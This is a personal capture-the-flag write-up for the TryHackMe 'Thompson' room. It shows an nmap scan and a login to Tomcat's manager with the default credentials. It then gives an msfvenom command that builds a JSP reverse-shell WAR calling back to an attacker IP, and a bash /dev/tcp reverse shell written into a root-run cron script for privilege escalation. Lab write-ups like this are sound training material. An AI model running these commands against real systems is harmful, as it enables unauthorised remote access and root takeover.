---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Thompson
# DESCRIPTION       . boot2root machine for FIT and bsides guatemala CTF
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/bsidesgtthompson
```

```
nmap -sSVC -T5 -p- -oN thompson 10.10.58.155
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc052481987eb8db0592a6e78eb02111 (RSA)
|   256 60c840abb009843d46646113fabc1fbe (ECDSA)
|_  256 b5527e9c019b980c73592035ee23f1a5 (ED25519)

8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request

8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### PORT 8009 

- I tried exploiting the `ghostcat` vulnerability since the Jserv Protocol is open but it didn't reveal any credentials. More details in [[THM - Tomghost]] ; pretty much exact scenario so far.

#### PORT 8080

- I've checked for the `/manager` page but it asked for credentials. I clicked on cancel and got redirected to a `401 Unauthorized` page with the following credentials example

```
For example, to add the manager-gui role to a user named tomcat with a password of {REDACTED}, add the following to the config file listed above.

<role rolename="manager-gui"/>
<user username="tomcat" password="{REDACTED}" roles="manager-gui"/>
```

- So I've tried that default pair of credentials ... they worked :) 

- So we have access to Tomcat's Web Application Manager. The simplest thing we can do here is to upload a `.war` file that executes a reverse shell. 

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_ip LPORT=9999 -f war -o shell.war
```

- Upload the resulted file in the apache manager and deploy it. 

- Then, start a listener and access the webpage.

- I got a connection back under the user `tomcat`. 

- I took a look in `/home/jack` and found the following

- `id.sh` is a script what is writable by us but owned by jack. However, I checked crontab and it seems to be executed by root every minute, so whatever we write in this will get executed as root.

- I've replaced the content with a bash reverse shell

```
#!/bin/bash
sh -i >& /dev/tcp/ip/3131 0>&1
```

- This allowed me to start another reverse shell and to escalate privileges to `root`.

- First flag is in `/home/jack/user.txt`. 
- Last flag is in `/root/root.txt`. 